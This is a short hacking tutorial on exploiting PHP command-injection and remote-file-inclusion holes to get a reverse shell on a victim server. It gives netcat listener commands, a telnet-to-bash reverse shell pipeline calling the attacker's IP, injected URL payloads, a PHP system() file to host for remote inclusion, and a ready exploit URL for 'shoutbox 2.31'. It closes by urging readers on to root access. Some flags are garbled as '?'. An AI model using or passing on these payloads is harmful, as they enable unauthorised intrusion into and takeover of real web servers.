This article is not a guide how to find php holes, but an example of using those holes and gaining access to shells. 
 
 
 
You will need: 
 
- time 
 
- a Server, which we are going to hack (with a php hole) 
 
- netcat 
 
- a brain;) 
 
 
After installing netcat on your CPU, you'll need to set the port listining on ports 21 and 80. Why those? Simple, because they're opened on allmost e 
tery firewall. 
 
Start a new seesion and write: 
 
 
 
nc ?l ?n ?v ?p 21 
You'll get this answer: 
 
Listening on [any] 21 
 
 
 
Now start a second session and write: 
 
 
 
Nc ?l ?n ?v ?p 80 
 
The answer will be: 
 
Listening on [any] 80 
 
 
Netcat is now listening on port 21 and 80. 
 
 
 
Now you'll have to send a shell on your listening ports, do it by using this command: 
 
/bin/telnet your.ip 21 | /bin/bash | /bin/telnet your.ip 80 
 
 
 
 
 
'your.ip' is the place, where you past your ip, /bin/bash is the shell you want to get, 21 and 80 are the ports listening on your netcat. 
 
Of course telnet could be somewhere else, you can check this with the command: 
 
whereis telnet 
 
Ok, for sure you're wondering how to connect to the php hole, right? 
 
 
 
There're two methods, depending on the php hole. The first: 
 
 
http://victim.com/script/index.php?variable=/bin/telnet%20127.0.0.1%2021%20|%20/bin/bash%20|%20/bin/telnet%20127.0.0.1%2080 
 
 
 
run such a link and on your terminal where the port 21 is listening you should see such a info: 
 
Connecting from victim.com [21] 
 
The second method is: 
 
 
Make such a php file: 
 
system("/bin/telnet 127.0.0.1 21 | /bin/bash | /bin/telnet 127.0.0.1 80"); 
?> 
and upload it on a server without php. 
 
Now run: 
 
 
http://victim.com/script/index.php?variable=http://ourserver.com/script.php 
 
 
On your terminal where the port 21 is listening you should see the same info: 
 
Connecting from victim.com [21] 
 
 
 
Now you have a easy and fast access to the shell with apache rights. 
 
Write your commands in the terminal where port 21 is listening. The results will come on the other terminal with port 80 listening. 
 
Now you can easily gain root access if you want and I'm sure you will;) 
 
Now an example: 
 
A hole in shoutbox 2.31: 
 
Make a file named shoutboxconf.php: 
 
system("/bin/telnet your.ip 21 | /bin/bash | /bin/telnet your.ip 80"); 
?> 
upload it on a server and go to: 
 
http://victim.com/shoutbox.php?conf=http://yourserver.com/shoutboxconf.php 
 
That's it, hope you enjoyed this article;)
